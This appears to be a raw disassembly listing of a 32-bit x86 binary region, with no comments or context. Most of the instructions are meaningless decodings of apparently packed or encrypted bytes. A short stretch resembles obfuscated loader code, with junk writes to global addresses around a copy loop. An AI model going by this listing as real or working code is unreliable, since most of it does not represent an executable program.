  413fa7:	pop    dx
  413fa9:	pop    es
  413faa:	dec    ecx
  413fab:	popa   
  413fac:	sbb    DWORD PTR ds:0xd2e2a5b,esp
  413fb2:	rcl    bl,1
  413fb4:	xchg   edi,edx
  413fb6:	push   edx
  413fb7:	mov    al,0xa6
  413fb9:	jno    0x413fa9
  413fbb:	rcr    BYTE PTR [edx],cl
  413fbd:	popa   
  413fbe:	stc    
  413fbf:	xchg   esi,eax
  413fc0:	mov    ebp,DWORD PTR [edi]
  413fc2:	out    dx,eax
  413fc3:	sar    DWORD PTR [ecx+edx*2-0x656ed73c],0xec
  413fcb:	jmp    0x413f86
  413fcd:	test   DWORD PTR [edx+0x74a17675],esi
  413fd3:	push   cs
  413fd4:	mov    esp,0xeda5caf2
  413fd9:	mov    edi,0xb45cce59
  413fde:	dec    eax
  413fdf:	jne    0x414052
  413fe1:	or     eax,0xe9a42434
  413fe6:	sbb    al,0x7e
  413fe8:	pop    edx
  413fe9:	retf   
  413fea:	inc    esi
  413feb:	push   edi
  413fec:	push   sp
  413fee:	mov    dh,0x67
  413ff0:	xchg   esp,eax
  413ff1:	(bad)  
  413ff2:	scas   eax,DWORD PTR es:[edi]
  413ff3:	sbb    ch,BYTE PTR [eax+0x74]
  413ff6:	mov    bl,0x92
  413ff8:	inc    edi
  413ff9:	push   ecx
  413ffa:	or     DWORD PTR [edx],ebp
  413ffc:	inc    eax
  413ffd:	cld    
  413ffe:	pop    ds
  413fff:	mov    eax,ds:0x3be3679e
  414004:	or     eax,0x977970db
  414009:	ins    BYTE PTR es:[edi],dx
  41400a:	aam    0xd2
  41400c:	pop    edi
  41400d:	leave  
  41400e:	push   ss
  41400f:	xor    al,BYTE PTR [ebp-0x6c8a5e8a]
  414015:	call   0x8507:0x211029c8
  41401c:	iret   
  41401d:	popa   
  41401e:	lea    esi,[edx]
  414020:	cmp    esp,edi
  414022:	push   ds
  414023:	(bad)  
  414024:	jecxz  0x413fc2
  414026:	call   0xd5e:0x1f5ddba7
  41402d:	mov    al,ds:0xe03ff4ad
  414032:	adc    DWORD PTR [eax-0x691e4d3c],edx
  414038:	int    0xc7
  41403a:	loopne 0x4140b1
  41403c:	int    0x7a
  41403e:	test   BYTE PTR [ecx+0x72],ah
  414041:	lods   al,BYTE PTR ds:[esi]
  414042:	in     al,0x21
  414044:	push   ds
  414045:	test   eax,0x612fc9f
  41404a:	hlt    
  41404b:	and    ch,bl
  41404d:	push   esp
  41404e:	jbe    0x413fe5
  414050:	pop    ds
  414051:	fcomp  QWORD PTR [esi]
  414053:	xchg   esp,eax
  414054:	push   ds
  414055:	sub    cl,BYTE PTR [ebx]
  414057:	je     0x413fdf
  414059:	push   esi
  41405a:	adc    BYTE PTR [ebx-0x38],dh
  41405d:	push   0xffffffa3
  41405f:	dec    esi
  414060:	or     al,0xfc
  414062:	jmp    0x413ff5
  414064:	jnp    0x41405c
  414066:	cmp    DWORD PTR [ecx+edx*8+0x49789bdb],0xd3acea7c
  414071:	jo     0x4140ee
  414073:	in     eax,0xf8
  414075:	or     eax,DWORD PTR [ebp+0x79]
  414078:	dec    eax
  414079:	imul   esi,DWORD PTR fs:[edi],0x6278794e
  414080:	ja     0x414051
  414082:	xor    eax,0x8cfc6c0d
  414087:	dec    eax
  414088:	sub    eax,0xcf1b9fb7
  41408d:	js     0x414070
  41408f:	pushf  
  414090:	stos   DWORD PTR es:[edi],eax
  414091:	neg    BYTE PTR [edi+0x23]
  414094:	sbb    al,0x3d
  414096:	ins    BYTE PTR es:[edi],dx
  414097:	cld    
  414098:	push   ds
  414099:	cmp    bl,BYTE PTR [eax+ecx*2]
  41409c:	(bad)  
  41409e:	scas   al,BYTE PTR es:[edi]
  41409f:	and    BYTE PTR [ebx-0x57],dh
  4140a2:	mov    ds:0x97ba4fe3,al
  4140a7:	inc    ebp
  4140a8:	pop    es
  4140a9:	mov    esi,0xfc473e2
  4140ae:	std    
  4140af:	mov    al,0x93
  4140b1:	sti    
  4140b2:	mov    esi,DWORD PTR [esi-0x505a91b9]
  4140b8:	jnp    0x4140c3
  4140ba:	mov    eax,0xa94e70ee
  4140bf:	pop    ss
  4140c0:	mov    eax,ds:0x857bb357
  4140c5:	inc    edi
  4140c6:	inc    ecx
  4140c7:	int    0x2a
  4140c9:	cld    
  4140ca:	test   BYTE PTR [ebp-0x4eb31d22],0xae
  4140d1:	push   edi
  4140d2:	push   es
  4140d3:	push   esi
  4140d4:	mov    eax,0x75108af
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x5695c7a7],dl
  41419c:	mov    bl,0xcc
  41419e:	mov    dh,0x95
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x1034178d],0x12
  4141ac:	pusha  
  4141ad:	test   al,0x5
  4141af:	xchg   edi,eax
  4141b0:	ret    0x568a
  4141b3:	bound  ecx,QWORD PTR [ebx+edi*2-0x14]
  4141b7:	test   al,0xb9
  4141b9:	inc    eax
  4141ba:	ss pop esp
  4141bc:	and    ebx,DWORD PTR [edi-0x35]
  4141bf:	stos   BYTE PTR es:[edi],al
  4141c0:	retf   
  4141c1:	pop    eax
  4141c2:	mov    esp,0xfd17fdeb
  4141c7:	xchg   ebp,eax
  4141c8:	dec    esp
  4141c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ca:	adc    DWORD PTR [esp+ecx*8+0x67985c59],ebp
  4141d1:	dec    edx
  4141d2:	xor    al,0x77
  4141d4:	in     al,dx
  4141d5:	jp     0x41419d
  4141d7:	mov    es,WORD PTR [edi-0x51]
  4141da:	push   ds
  4141db:	mov    ch,0x10
  4141dd:	pop    es
  4141de:	xor    ebp,DWORD PTR [esi-0x33a4dde7]
  4141e4:	stc    
  4141e5:	mov    al,0x25
  4141e7:	xor    BYTE PTR [edx+ecx*1],0x0
  4141eb:	fsubr  st,st(0)
  4141ed:	in     eax,0xc9
  4141ef:	dec    ebp
  4141f0:	adc    eax,esp
  4141f2:	fcmovu st,st(4)
  4141f4:	push   es
  4141f5:	mov    dh,0xb
  4141f7:	sar    DWORD PTR [edx+edi*2-0x34c3f4b5],cl
  4141fe:	xchg   DWORD PTR [esi-0x6ce09197],ebp
  414204:	push   ss
  414205:	jmp    0x41422a
  414207:	daa    
  414208:	mov    esi,0x6762d143
  41420d:	inc    esp
  41420e:	bound  eax,QWORD PTR fs:[eax]
  414211:	imul   ebx,DWORD PTR [esi+0x63],0x1adb6a8
  414218:	mov    ebp,0xb978af4a
  41421d:	enter  0x9a1f,0x61
  414221:	mov    ch,0x3
  414223:	inc    ecx
  414224:	xchg   ebx,eax
  414225:	sbb    ch,bl
  414227:	or     DWORD PTR [edx+0x531a070d],0x78
  41422e:	and    al,0xe7
  414230:	pop    ecx
  414231:	sti    
  414232:	pop    ebx
  414233:	sar    BYTE PTR [ecx+0x386c55d0],1
  414239:	xor    esp,DWORD PTR [edx]
  41423b:	gs adc al,0xf1
  41423e:	pop    edi
  41423f:	mov    edx,0x924766b8
  414244:	rcr    DWORD PTR [ebx+eax*2],0x69
  414248:	xor    edi,DWORD PTR [ecx-0x1890e573]
  41424e:	frstpm(287 only) 
  414250:	push   es
  414251:	pop    eax
  414252:	push   0xc23c5205
  414257:	push   eax
  414258:	test   DWORD PTR [edi+0x4f],esp
  41425b:	pop    esp
  41425c:	fcom   QWORD PTR [esi-0x34]
  41425f:	mov    ah,0xa9
  414261:	cld    
  414262:	jle    0x414214
  414264:	inc    eax
  414265:	inc    esi
  414266:	fild   QWORD PTR [ebp+0x28]
  414269:	cmp    al,0x15
  41426b:	retf   0x95e
  41426e:	sbb    eax,0x944c0b93
  414273:	fcmovne st,st(4)
  414275:	test   DWORD PTR [ebp+0x353df0f0],0x69955c2f
  41427f:	pushf  
  414280:	dec    ebx
  414281:	xor    DWORD PTR [esi+0x432d1d20],esp
  414287:	pop    edi
  414288:	adc    al,0x48
  41428a:	jle    0x4142a8
  41428c:	call   0x566995b9
  414291:	mov    eax,ds:0xc32b01a8
  414296:	std    
  414297:	push   eax
  414298:	xor    eax,0x410baed8
  41429d:	sub    al,0x84
  41429f:	mov    esp,0xf15e6c94
  4142a4:	cmp    BYTE PTR [ebx-0x3755616a],bh
  4142aa:	push   ebx
  4142ab:	mov    eax,ds:0x5487deae
  4142b0:	jbe    0x4142bd
  4142b2:	out    0x74,al
  4142b4:	xchg   esp,eax
  4142b5:	leave  
  4142b6:	popa   
  4142b7:	nop
  4142b8:	mov    WORD PTR [eax],ds
  4142ba:	outs   dx,DWORD PTR ds:[esi]
  4142bb:	gs push ecx
  4142bd:	pop    ebp
  4142be:	mov    BYTE PTR [eax-0x25e7ed3d],dh
  4142c4:	pusha  
  4142c5:	and    DWORD PTR [eax],esi
  4142c7:	popf   
  4142c8:	int3   
  4142c9:	push   ebx
  4142ca:	(bad)  
  4142cb:	mov    ds:0x1db538d0,al
  4142d0:	sbb    ebp,DWORD PTR [edx]
  4142d2:	xchg   ebx,eax
  4142d3:	cmp    al,0x8e
  4142d5:	mov    bh,0x9e
  4142d7:	mov    esp,edi
  4142d9:	push   ss
  4142da:	push   esp
  4142db:	add    ch,bl
  4142dd:	or     cl,ch
  4142df:	add    BYTE PTR [eax+edi*8],dh
  4142e2:	jmp    0xebb4dc25
  4142e7:	mov    bh,0x80
  4142e9:	inc    esi
  4142ea:	fist   WORD PTR [eax-0x59]
  4142ed:	icebp  
  4142ee:	js     0x41428e
  4142f0:	inc    eax
  4142f1:	adc    esi,DWORD PTR [esi+0x34]
  4142f4:	or     DWORD PTR [ebx-0x77],edx
  4142f7:	and    al,0x66
  4142f9:	lods   eax,DWORD PTR ss:[esi]
  4142fb:	out    dx,al
  4142fc:	sbb    DWORD PTR [ecx-0x1b],edi
  4142ff:	jo     0x41430e
  414301:	in     eax,dx
  414302:	cmp    DWORD PTR [eax-0x15],eax
  414305:	push   esi
  414306:	xchg   BYTE PTR [ecx],ch
  414308:	fistp  WORD PTR [esi]
  41430a:	rol    BYTE PTR [ebx+edx*1-0x6ddedac1],1
  414311:	test   al,0x45
  414313:	jmp    0x414324
  414315:	repnz xor DWORD PTR [ebx+0xf],eax
  414319:	call   0x41df6d91
  41431e:	mov    ds:0xf390b87d,al
  414323:	es adc bl,ch
  414326:	int    0x2b
  414328:	cmp    eax,0xba6340d9
  41432d:	sub    esp,DWORD PTR [edi+0x11f08f9f]
  414333:	push   ss
  414334:	push   edi
  414335:	fst    DWORD PTR [ebx-0x48]
  414338:	fcmovnbe st,st(1)
  41433a:	out    dx,eax
  41433b:	pop    eax
  41433c:	jne    0x4143a7
  41433e:	js     0x4142e4
  414340:	addr16 ret 0x2608
  414344:	adc    BYTE PTR [ebx-0x76997f20],0xbe
  41434b:	rol    BYTE PTR [edi-0x7544c999],1
  414351:	int    0xfe
  414353:	test   eax,0xafdefe35
  414358:	jne    0x414310
  41435a:	repz jmp 0x4143c5
  41435d:	ins    BYTE PTR es:[edi],dx
  41435e:	mov    ebx,0xdc2c439d
  414363:	or     DWORD PTR [ecx-0x15],esi
  414366:	push   sp
  414368:	es mov eax,0x2e8a1f5d
  41436e:	pop    edi
  41436f:	outs   dx,BYTE PTR ds:[esi]
  414370:	xlat   BYTE PTR ds:[ebx]
  414371:	cmp    DWORD PTR [ebp+0x73],eax
  414374:	sbb    dh,dl
  414376:	add    eax,0x1a10bc63
  41437b:	mov    esi,0x86e81193
  414380:	mov    ch,BYTE PTR [esi+0x6d]
  414383:	add    al,0xce
  414385:	mov    ds:0xa4ea6613,eax
  41438a:	push   ebp
  41438b:	jns    0x4143d1
  41438d:	sub    eax,0x9e64783d
  414392:	mov    edx,0x95d7a11e
  414397:	stos   DWORD PTR es:[edi],eax
  414398:	mov    ch,0xb5
  41439a:	push   edx
  41439b:	push   ebx
  41439c:	in     al,0x77
  41439e:	and    DWORD PTR [esi+0x78ca9e43],edi
  4143a4:	xor    bl,BYTE PTR [ebp+0x4f]
  4143a7:	lods   al,BYTE PTR ds:[esi]
  4143a8:	xchg   ecx,eax
  4143a9:	xchg   esi,eax
  4143aa:	(bad)  
  4143ab:	imul   esi,DWORD PTR [esi],0x10
  4143ae:	imul   ebp,edi,0x1e263ef3
  4143b4:	jne    0x414351
  4143b6:	mov    bh,0xb0
  4143b8:	pop    esp
  4143b9:	leave  
  4143ba:	mov    DWORD PTR [edx],ecx
  4143bc:	loop   0x41435d
  4143be:	loope  0x41440d
  4143c0:	and    DWORD PTR [esi+edx*2],esi
  4143c3:	jge    0x414370
  4143c5:	ds inc ebp
  4143c7:	ins    BYTE PTR es:[edi],dx
  4143c8:	les    esi,FWORD PTR [edi+ecx*8+0x5bd4db6b]
  4143cf:	js     0x414387
  4143d1:	test   eax,0x69302b78
  4143d6:	sbb    al,0xd
  4143d8:	fild   QWORD PTR [ecx]
  4143da:	js     0x4143f5
  4143dc:	dec    ebp
  4143dd:	mov    ebx,0x14575f8a
  4143e2:	pop    ds
  4143e3:	push   edi
  4143e4:	cdq    
  4143e5:	push   eax
  4143e6:	jnp    0x41439f
  4143e8:	lock inc edx
  4143ea:	(bad)  
  4143eb:	xor    eax,0xc1f2fa44
  4143f0:	loope  0x4143ed
  4143f2:	mov    eax,0xfc9f0e77
  4143f7:	push   eax
  4143f8:	add    eax,0xd97cca7a
  4143fe:	lea    ebx,[edx+0x3aef96fb]
  414404:	pop    edx
  414405:	ja     0x414420
  414407:	int3   
  414408:	(bad)  
  414409:	fsubr  st,st(6)
  41440b:	push   eax
  41440c:	imul   esp,eax,0x90bd2b5
  414412:	mov    ebx,0x381b7ff9
  414417:	sub    al,bh
  414419:	mov    dl,0x2f
  41441b:	ret    0xdf89
  41441e:	inc    esp
  41441f:	mov    bl,0xdb
  414421:	lods   eax,DWORD PTR ds:[esi]
  414422:	rcr    BYTE PTR [ecx-0x2bbedaab],cl
  414428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414429:	jg     0x4143ac
  41442b:	daa    
  41442c:	push   es
  41442d:	ja     0x4143b3
  41442f:	add    cl,cl
  414431:	sub    BYTE PTR [edx],0x2f
  414434:	pop    edx
  414435:	mov    ecx,0xbd7c2109
  41443a:	sub    dh,cl
  41443c:	lahf   
  41443d:	out    0x15,eax
  41443f:	sub    al,0x7e
  414441:	jnp    0x41440e
  414443:	cmp    BYTE PTR [ebp+0x688a4ad6],cl
  414449:	add    cl,BYTE PTR [ebx-0x6]
  41444c:	sbb    BYTE PTR fs:[edi-0x48533796],0xce
  414454:	mov    eax,0xeb432d65
  414459:	xchg   ebx,eax
  41445a:	push   ds
  41445b:	sbb    cl,bl
  41445d:	cs push esi
  41445f:	or     eax,0x81ef61bd
  414464:	(bad)  
  414466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414467:	(bad)  
  414469:	inc    edi
  41446a:	mov    dl,0xb
  41446c:	ins    DWORD PTR es:[edi],dx
  41446d:	dec    esi
  41446e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446f:	cmp    DWORD PTR [esi+ebx*1],esi
  414472:	mov    eax,0x8ef97814
  414477:	push   ecx
  414478:	fs xchg esp,eax
  41447a:	adc    esi,esi
  41447c:	aas    
  41447d:	add    BYTE PTR [edi],bl
  41447f:	aad    0xc2
  414481:	das    
  414482:	cdq    
  414483:	xchg   ebp,eax
  414484:	sbb    eax,0xac8148e6
  414489:	dec    edx
  41448a:	xchg   ecx,eax
  41448b:	test   dl,al
  41448d:	scas   al,BYTE PTR es:[edi]
  41448e:	ds pop es
  414490:	push   ss
  414491:	adc    eax,0xb5d4d2e1
  414496:	adc    BYTE PTR [esi],bh
  414498:	stos   BYTE PTR es:[edi],al
  414499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449a:	add    edx,DWORD PTR [ecx-0x51030dad]
  4144a0:	lea    esp,[ebp+0x7c]
  4144a3:	or     edi,DWORD PTR [eax]
  4144a5:	jns    0x4144fe
  4144a7:	in     eax,dx
  4144a8:	lahf   
  4144a9:	sahf   
  4144aa:	dec    esi
  4144ab:	mov    esi,0x9938e628
  4144b0:	sbb    bl,BYTE PTR [esi-0x13]
  4144b3:	in     eax,dx
  4144b4:	es inc ecx
  4144b6:	push   esi
  4144b7:	xchg   BYTE PTR [eax-0x44b6312a],dl
  4144bd:	mov    edi,0x8d91a44c
  4144c2:	aad    0xe3
  4144c4:	rep outs dx,DWORD PTR ds:[esi]
  4144c6:	adc    eax,0x5b2d59da
  4144cb:	stc    
  4144cc:	mov    eax,ds:0x8801e031
  4144d1:	adc    BYTE PTR [ebx-0x6af76c19],cl
  4144d7:	cmp    al,0x54
  4144d9:	test   DWORD PTR [ebx+0x57dd66ad],esp
  4144df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144e0:	sbb    al,0x9
  4144e2:	push   es
  4144e3:	jo     0x4144d5
  4144e5:	pusha  
  4144e6:	popa   
  4144e7:	cmc    
  4144e8:	mov    bh,0x1c
  4144ea:	or     dh,BYTE PTR [edi-0x5e52350a]
  4144f0:	jns    0x414521
  4144f2:	xlat   BYTE PTR ds:[ebx]
  4144f3:	int3   
  4144f4:	push   0x9c61ae8c
  4144f9:	or     eax,0x906bc63c
  4144fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144ff:	iret   
  414500:	loope  0x4144f3
  414502:	jge    0x414497
  414504:	test   BYTE PTR [ecx+ecx*8],dh
  414507:	lods   eax,DWORD PTR ds:[esi]
  414508:	cld    
  414509:	(bad)  
  41450b:	adc    BYTE PTR [ebp+ebx*1+0xd],al
  41450f:	fadd   st(7),st
  414511:	shr    DWORD PTR [edi+ebp*2],cl
  414514:	mov    bh,0x13
  414516:	push   esi
  414517:	das    
  414518:	mov    dh,0x6b
  41451a:	mov    al,0xd1
  41451c:	sbb    DWORD PTR [ebp+eiz*1-0x4fe1a1f8],ecx
  414523:	mov    esi,0x3e18c3e5
  414528:	outs   dx,DWORD PTR ds:[esi]
  414529:	fcompp 
  41452b:	mov    dl,0x0
  41452d:	and    bl,dh
  41452f:	sub    DWORD PTR [ecx+0x5c],0xc21bc493
  414536:	fs loop 0x4144df
  414539:	pop    eax
  41453a:	fdivr  QWORD PTR ss:[ebp-0x22]
  41453e:	adc    DWORD PTR [ebx-0x23b3f48d],esi
  414544:	cmp    DWORD PTR [esi+0x21],ecx
  414547:	and    eax,0xc91e8a5d
  41454c:	inc    edi
  41454d:	mov    dh,0x61
  41454f:	stc    
  414550:	or     BYTE PTR [edx-0x41731c08],bl
  414556:	scas   al,BYTE PTR es:[edi]
  414557:	and    edx,esi
  414559:	test   BYTE PTR [edi],ch
  41455b:	loope  0x4144f1
  41455d:	cld    
  41455e:	or     eax,0x4fdf68ed
  414563:	fld    QWORD PTR [edx-0x66]
  414566:	xchg   DWORD PTR [esi+0x60875d43],esp
  41456c:	push   0xac38b166
  414571:	jb     0x414526
  414573:	retf   
  414574:	sub    eax,0x96b17e70
  414579:	mov    dh,0xf2
  41457b:	mov    ds:0xdc7c040a,eax
  414580:	xor    BYTE PTR [ebx],0x8d
  414583:	mov    ch,0xbc
  414585:	sub    ebx,ebp
  414587:	data16 and al,0xb5
  41458a:	in     eax,dx
  41458b:	das    
  41458c:	push   cs
  41458d:	mov    dl,0xa3
  41458f:	and    DWORD PTR [esi-0x6b],0x9460f4a5
  414596:	pop    eax
  414597:	sub    al,0xf
  414599:	jae    0x4145e8
  41459b:	imul   edx,ebp,0x220914d7
  4145a1:	and    BYTE PTR [eax-0x6c425865],bh
  4145a7:	cmp    BYTE PTR [esi+0x5f],dl
  4145aa:	fdivr  DWORD PTR [esi+0x931b2fc]
  4145b0:	scas   eax,DWORD PTR es:[edi]
  4145b1:	or     BYTE PTR [eax+0x58a605da],ch
  4145b7:	(bad)  
  4145b8:	retf   
  4145b9:	lods   al,BYTE PTR ds:[esi]
  4145ba:	mov    eax,ds:0x423f4fdf
  4145bf:	sbb    BYTE PTR [ebp+0x770d183d],dl
  4145c5:	imul   esi,DWORD PTR [esp+edi*8+0x7969f085],0xb4c1ab36
  4145d0:	xchg   ecx,eax
  4145d1:	test   DWORD PTR [edx-0x429f23cf],ecx
  4145d7:	xor    al,BYTE PTR [ebx]
  4145d9:	mov    dh,0xf9
  4145db:	ins    DWORD PTR es:[edi],dx
  4145dc:	fstp   st(1)
  4145de:	int3   
  4145df:	jnp    0x4145d6
  4145e1:	mov    al,0xcb
  4145e3:	sbb    edx,DWORD PTR [ebx+0x1fddb0bc]
  4145e9:	lds    eax,FWORD PTR [edx]
  4145eb:	pop    eax
  4145ec:	cmp    al,0xe1
  4145ee:	sti    
  4145ef:	push   cs
  4145f0:	jo     0x41466a
  4145f2:	stos   BYTE PTR es:[edi],al
  4145f3:	loope  0x414646
  4145f5:	icebp  
  4145f6:	inc    esp
  4145f7:	push   edx
  4145f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f9:	sub    al,0x25
  4145fb:	sub    esi,ebp
  4145fd:	call   DWORD PTR [ebx]
  4145ff:	ffreep st(3)
  414601:	dec    ebp
  414602:	or     BYTE PTR [edx+0x6],cl
  414605:	push   ebp
  414606:	pop    es
  414607:	mov    edi,edi
  414609:	adc    eax,0x49463496
  41460e:	xor    al,0x58
  414610:	imul   esi,DWORD PTR [edx],0xffffff81
  414613:	jnp    0x41462b
  414615:	inc    ebx
  414616:	adc    eax,0xfd047c5e
  41461b:	ins    DWORD PTR es:[edi],dx
  41461c:	add    DWORD PTR [ecx],eax
  41461e:	pushf  
  41461f:	mov    esi,0xd24adb50
  414624:	mov    al,ds:0xaa77cb0f
  414629:	call   0x6206:0x1908128c
  414630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414631:	jo     0x4145db
  414633:	cdq    
  414634:	stc    
  414635:	push   ebx
  414636:	test   DWORD PTR [ecx],eax
  414638:	sar    BYTE PTR [edx+edi*8+0x32677cf4],cl
  41463f:	add    dl,BYTE PTR [ebx]
  414641:	mov    ds:0x4fc6f649,al
  414646:	jecxz  0x4146b7
  414648:	dec    eax
  414649:	cmp    ah,cl
  41464b:	xchg   esp,eax
  41464c:	push   esi
  41464d:	add    DWORD PTR [ecx-0x71],edi
  414650:	add    esp,DWORD PTR [edx]
  414652:	push   eax
  414653:	or     BYTE PTR [eax],bh
  414655:	xor    al,BYTE PTR [ebp*2-0x24543988]
  41465c:	adc    eax,ecx
  41465e:	js     0x414667
  414660:	cmc    
  414661:	fcomi  st,st(6)
  414663:	sub    DWORD PTR ds:0x9c335931,ebx
  414669:	(bad)  
  41466a:	shl    BYTE PTR [ebx-0x1dbfd6e5],1
  414670:	test   DWORD PTR [edx],esi
  414672:	repz iret 
  414674:	pop    es
  414675:	and    DWORD PTR [esi+edx*2+0x65aa6aa8],eax
  41467c:	test   eax,0xa97f5016
  414681:	dec    ecx
  414682:	pop    esp
  414683:	xor    DWORD PTR [eax],ebp
  414685:	arpl   WORD PTR [ecx+0x19],dx
  414688:	rcr    DWORD PTR [ecx+0x46454472],1
  41468e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468f:	or     esp,DWORD PTR [esi-0x4c]
  414692:	sti    
  414693:	aas    
  414694:	mov    edx,0x91f4a922
  414699:	and    edx,DWORD PTR [eax+edi*1-0xd]
  41469d:	and    DWORD PTR [ecx-0x4812d442],eax
  4146a3:	add    eax,0xddf5b0fc
  4146a8:	cmp    BYTE PTR [ecx+0x579c3f5a],cl
  4146ae:	fcomp  QWORD PTR [edi+edi*2-0x728d7fe0]
  4146b5:	cmp    eax,0xb8b69f6e
  4146ba:	popa   
  4146bb:	icebp  
  4146bc:	mov    cl,0xd5
  4146be:	cli    
  4146bf:	mov    DWORD PTR [eax],ebx
  4146c1:	sub    dh,BYTE PTR [eax+0x50]
  4146c4:	out    dx,eax
  4146c5:	mov    WORD PTR [ecx],ss
  4146c7:	mov    ds:0xa5a9c8a5,eax
  4146cc:	retf   
  4146cd:	dec    eax
  4146ce:	(bad)
  4146d1:	dec    ebp
  4146d2:	push   es
  4146d3:	stos   BYTE PTR es:[edi],al
  4146d4:	mov    al,ds:0x4414cb16
  4146d9:	int3   
  4146da:	stos   DWORD PTR es:[edi],eax
  4146db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146dc:	inc    edi
  4146dd:	outs   dx,BYTE PTR ds:[esi]
  4146de:	mov    ah,BYTE PTR [edi+0x25b4a8d4]
  4146e4:	inc    edx
  4146e5:	icebp  
  4146e6:	adc    eax,0x4af091f5
  4146eb:	test   eax,0x7bb1e414
  4146f0:	fsqrt  
  4146f2:	pop    ss
  4146f3:	pmullw mm0,mm7
  4146f6:	sub    DWORD PTR [ebp-0x14],edx
  4146f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146fa:	stos   DWORD PTR es:[edi],eax
  4146fb:	into   
  4146fc:	xchg   DWORD PTR [edx-0x1fa94967],ebx
  414702:	pop    esi
  414703:	adc    eax,0xbcda428
  414708:	mov    ds:0x9e46fb80,eax
  41470d:	sub    eax,0x69095157
  414712:	xchg   esp,eax
  414713:	mov    DWORD PTR [ecx],eax
  414715:	repz mov eax,0xcd33278e
  41471b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41471c:	ret    0xb809
  41471f:	cld    
  414720:	cmp    DWORD PTR [edx+0x194aaca5],ebx
  414726:	clc    
  414727:	or     cl,BYTE PTR [esi]
  414729:	add    edi,DWORD PTR ds:0xc7e2aa28
  41472f:	mov    ecx,0x2978431b
  414734:	mov    WORD PTR [eax+0x46cd5a95],?
  41473a:	jns    0x414761
  41473c:	xchg   ebp,eax
  41473d:	hlt    
  41473e:	inc    esp
  41473f:	fdivrp st(6),st
  414741:	and    DWORD PTR [eax+0x743bd26a],ecx
  414747:	sbb    edi,DWORD PTR ds:0x771e43d3
  41474d:	push   ds
  41474e:	frstor [edx+eiz*2-0x33edc11]
  414755:	cli    
  414756:	(bad)  
  414757:	pop    edi
  414758:	cmc    
  414759:	cmp    ecx,DWORD PTR [ecx-0x6d6fe218]
  41475f:	jle    0x4146f2
  414761:	in     eax,0xbb
  414763:	test   BYTE PTR [ecx+0x34],cl
  414766:	jg     0x4147e2
  414768:	pop    esi
  414769:	clc    
  41476a:	scas   eax,DWORD PTR es:[edi]
  41476b:	mov    ecx,edi
  41476d:	and    edi,DWORD PTR [ebp+0x23]
  414770:	xor    DWORD PTR [edx+0x62],ebx
  414773:	pop    esp
  414774:	mov    dh,al
  414776:	fwait
  414777:	pushf  
  414778:	adc    DWORD PTR [ebx],0xffffff80
  41477b:	dec    edx
  41477c:	dec    ecx
  41477d:	jmp    0x41470d
  41477f:	fsub   st(3),st
  414781:	loopne 0x4147e4
  414783:	fs sti 
  414785:	inc    esp
  414786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414787:	aad    0x39
  414789:	pop    es
  41478a:	loope  0x4147c1
  41478c:	sar    DWORD PTR [ebx-0x186f44ed],0xb7
  414793:	dec    ebp
  414794:	mov    eax,ds:0xba76be74
  414799:	inc    ecx
  41479a:	in     eax,dx
  41479b:	cmc    
  41479c:	aas    
  41479d:	out    0xea,eax
  41479f:	jge    0x414727
  4147a1:	mov    bh,0xcf
  4147a3:	loop   0x414748
  4147a5:	hlt    
  4147a6:	mov    ebp,0xaba2e411
  4147ab:	or     DWORD PTR [edx-0x3cd59813],edx
  4147b1:	dec    esi
  4147b2:	(bad)  
  4147b3:	xchg   ecx,eax
  4147b4:	call   0x5b29:0xc7dd64a5
  4147bb:	das    
  4147bc:	add    DWORD PTR [ebp-0x253c362c],eax
  4147c2:	shl    BYTE PTR [ecx+0x287238a3],0xb4
  4147c9:	cmp    esi,esp
  4147cb:	mov    edi,0x855f2062
  4147d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d1:	push   edi
  4147d2:	dec    esp
  4147d3:	imul   esi,eax,0x2d
  4147d6:	loop   0x41483e
  4147d8:	imul   eax,DWORD PTR [edi-0x7d],0x87d1d953
